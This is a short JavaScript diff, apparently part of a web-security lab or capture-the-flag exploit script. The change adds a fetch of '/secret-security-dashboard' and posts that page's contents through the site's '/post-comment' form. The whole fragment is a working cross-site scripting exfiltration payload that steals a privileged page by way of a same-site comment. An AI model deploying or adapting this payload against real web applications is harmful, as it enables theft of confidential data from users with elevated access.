@@ -6,10 +6,12 @@
       body: `id=${id}`
     }).then(res => res.text());
 
+    const secret = await fetch('/secret-security-dashboard').then(res => res.text());
+
     const r = await fetch('/post-comment', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: 'comment-author=test' + txt + '&comment2=test' + txt
+      body: 'comment-author=test' + txt + '&comment2=test' + secret
     });
   }
 })();
